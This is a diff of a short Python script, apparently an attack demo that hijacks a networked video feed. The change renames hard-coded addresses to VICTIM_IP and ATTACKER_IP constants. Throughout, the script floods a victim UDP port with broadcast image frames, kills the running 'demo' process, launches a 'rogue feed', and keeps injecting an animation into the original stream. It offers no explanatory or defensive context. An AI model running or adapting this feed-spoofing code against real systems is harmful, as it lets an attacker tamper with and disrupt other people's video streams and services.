@@ -1,5 +1,11 @@
 #!/usr/bin/env python
 
+VICTIM_IP = '255.255.255.255'
+VICTIM_PORT = 4000
+
+ATTACKER_IP = '255.255.255.255'
+ATTACKER_PORT = 5000
+
 from socket import *
 from time import sleep
 from glob import glob
@@ -28,7 +34,7 @@ s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
 # Send a few flashes        
 for i in range(0, 10):
     for j in range(0, i):
-        s.sendto(images[0], ('255.255.255.255', 4000))
+        s.sendto(images[0], (VICTIM_IP, VICTIM_PORT))
     sleep((10 - i) / 30.0)
 
 # Kill the demo
@@ -37,11 +43,11 @@ system('killall -SIGINT demo')
 
 # Start rogue feed
 # Sleep to avoid contention over USB
-system('(sleep 3; ./demo 255.255.255.255 5000) &')
+system('(sleep 3; ./demo %s %d) &' % (ATTACKER_IP, ATTACKER_PORT))
 
 # Send animation on original feed
 i = 0
 while True:
-    s.sendto(images[i], ('255.255.255.255', 4000))
+    s.sendto(images[i], (VICTIM_IP, VICTIM_PORT))
     i = (i + 1) % len(images)
     sleep(0.2)
